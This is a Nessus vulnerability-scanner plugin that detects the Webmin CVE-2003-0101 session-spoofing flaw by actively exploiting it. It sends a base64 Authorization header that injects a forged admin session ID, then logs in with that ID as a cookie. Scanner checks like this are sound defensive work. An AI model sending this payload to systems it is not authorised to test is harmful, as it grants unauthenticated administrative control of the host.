#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(11279);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_cve_id("CVE-2003-0101");
  script_bugtraq_id(6915);
  script_osvdb_id(10803);

  script_name(english:"Webmin 'miniserv.pl' Base-64 String Metacharacter Handling Session Spoofing");
  script_summary(english:"Spoofs a session ID.");

  script_set_attribute(attribute:"synopsis", value:"The remote service is vulnerable to a session spoofing attack.");
  script_set_attribute(attribute:"description", value:
"The remote server is running a version of Webmin that is vulnerable to
a Session ID spoofing attack. An attacker could use this flaw to log
in as admin on this host, and gain full control of the system.");
  script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=webmin-announce&m=104587858408101&w=2");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.070 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/02/24");
  script_set_attribute(attribute:"patch_publication_date", value:"2003/02/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webmin:webmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2003-2015 Tenable Network Security, Inc.");

  script_dependencie("webmin.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_keys("www/webmin");
  script_require_ports("Services/www", 10000);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

app = 'Webmin';
port = get_http_port(default:10000, embedded: TRUE);
get_kb_item_or_exit('www/'+port+'/webmin');

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

dir = "/";
install_url = build_url(port:port, qs:dir);

set_http_cookie(name:"testing", value:"1");
r = http_send_recv3(
  method : "GET",
  item   : dir,
  port   : port,
  add_headers : make_array( "User-Agent", "webmin",  "Authorization", "Basic YSBhIDEKbmV3IDEyMzQ1Njc4OTAgYWRtaW46cGFzc3dvcmQ="),
  exit_on_fail:TRUE
);
req1 = http_last_sent_request();

if (
  (egrep(pattern:"^HTTP/[0-9]\.[0-9] 401 ", string:r[0])) &&
  (!egrep(pattern:".*Webmin.*feedback_form\.cgi.*", string: r[2]))
)
{
  set_http_cookie(name:"testing", value:"1");
  set_http_cookie(name:"sid", value:"1234567890");
  r = http_send_recv3(method:"GET", item:dir, port:port, exit_on_fail:TRUE);

  #
  # I'm afraid of localizations, so I grep on the HTML source code,
  # not the message status.
  #
  if(egrep(pattern:".*Webmin.*feedback_form\.cgi.*", string:r[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\n' + 'Nessus was able to exploit this issue with the following pair of' +
        '\n' + 'requests : '+
        '\n' +
        '\n' + req1 + 
        '\n' +
        '\n' + http_last_sent_request() + 
        '\n';
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
